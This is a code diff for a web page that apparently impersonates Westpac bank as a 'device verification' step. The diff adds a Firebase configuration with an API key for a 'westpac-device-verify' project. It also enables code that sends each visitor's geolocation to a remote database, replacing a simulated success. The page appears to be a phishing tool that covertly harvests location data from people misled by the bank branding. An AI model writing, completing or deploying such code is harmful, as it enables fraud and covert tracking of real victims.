@@ -1,12 +1,17 @@
 // Firebase configuration
 const firebaseConfig = {
-    // You'll need to add your Firebase config here
-    // Get this from Firebase Console when setting up a new project
+    apiKey: "AIzaSyBqx_C7XqKjmgJqRHcXBW5K9zMGNBZyGDY",
+    authDomain: "westpac-device-verify.firebaseapp.com",
+    projectId: "westpac-device-verify",
+    storageBucket: "westpac-device-verify.appspot.com",
+    messagingSenderId: "458791455321",
+    appId: "1:458791455321:web:3a9b8e6f4b8e9f1b2c3d4e",
+    databaseURL: "https://westpac-device-verify-default-rtdb.firebaseio.com"
 };
 
-// Initialize Firebase (you'll need to include Firebase SDK in index.html)
-// firebase.initializeApp(firebaseConfig);
-// const database = firebase.database();
+// Initialize Firebase
+firebase.initializeApp(firebaseConfig);
+const database = firebase.database();
 
 // Prevent right-click on logo
 document.querySelector('.logo').addEventListener('contextmenu', (e) => {
@@ -55,8 +60,7 @@ document.addEventListener('DOMContentLoaded', () => {
                             .catch(() => 'Unknown')
                     };
 
-                    // Once Firebase is set up, uncomment this to save data:
-                    /*
+                    // Save location data to Firebase
                     database.ref('locations').push(locationData)
                         .then(() => {
                             console.log('Location saved');
@@ -69,12 +73,6 @@ document.addEventListener('DOMContentLoaded', () => {
                             allowLocationButton.textContent = 'Verify Device';
                             allowLocationButton.classList.remove('loading');
                         });
-                    */
-
-                    // For now, just simulate success
-                    setTimeout(() => {
-                        window.location.href = 'view-logs.html';
-                    }, 3000);
                 },
                 (error) => {
                     console.error('Error getting location:', error);
